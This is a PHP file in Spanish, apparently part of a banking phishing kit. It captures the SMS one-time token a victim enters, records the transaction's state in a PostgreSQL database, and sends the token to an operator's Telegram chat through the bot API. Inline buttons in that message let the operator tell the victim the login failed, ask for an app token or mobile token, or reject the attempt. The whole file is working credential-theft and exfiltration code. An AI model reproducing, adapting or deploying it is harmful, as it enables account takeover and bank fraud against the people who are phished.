<?php
// tokemovil-verify.php

session_start();
$config = require 'conexion.php';

$sms_token = $_POST['sms_token'] ?? 'No especificado';
$transaction_id = $_POST['transaction_id'] ?? null;

if (!$transaction_id) {
    header('Location: ../../index.php?error=notransaction');
    exit;
}

// --- Lógica de Base de Datos: Resetear estado a 0 ---
$db_config = $config['db'];
// ============ CAMBIO PARA POSTGRESQL ============
$dsn = "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";
try {
    $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $sql = "UPDATE a_confirmar SET estado = 0 WHERE id = :id";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':id' => $transaction_id]);
} catch (PDOException $e) {
    die("ERROR DE BASE DE DATOS: No se pudo actualizar el estado. <br><br>Mensaje: " . $e->getMessage());
}

// --- Lógica de Telegram ---
$telegram_config = $config['telegram'];
if (!isset($telegram_config['bot_token']) || !isset($telegram_config['chat_id'])) {
    header('Location: ../../index.php?id=' . $transaction_id);
    exit;
}

$botToken = $telegram_config['bot_token'];
$chatId = $telegram_config['chat_id'];

// Mensaje para Telegram
$message = "📱 *Código SMS Recibido* 📱\n\n";
$message .= "› *ID de Transacción:* `" . htmlspecialchars($transaction_id) . "`\n";
$message .= "› *Token SMS Ingresado:* `" . htmlspecialchars($sms_token) . "`\n\n";
$message .= "-------------------------------------\n";
$message .= "_Por favor, elija una acción para la transacción original._";

// ======================= INICIO DE LA MODIFICACIÓN =======================
// Botones de acción
$base_update_url = $config['base_url'];
$admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_update_url);

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '❌ Login Fallido', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=1'],
            ['text' => '⚠️ Pedir Token App', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=2'],
        ],
        [
            ['text' => '❌ Rechazar', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=3'],
            ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $transaction_id],          
        ],
        [
            ['text' => '🚫 Token Móvil Inválido', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=5']
        ]
    ]
];
$reply_markup = json_encode($keyboard);
// ======================= FIN DE LA MODIFICACIÓN =======================

$post_fields = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'reply_markup' => $reply_markup
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_exec($ch);
curl_close($ch);

// Redirección FINAL de vuelta a index.php para continuar la espera
header('Location: ../../index.php?id=' . $transaction_id);
exit;
?>

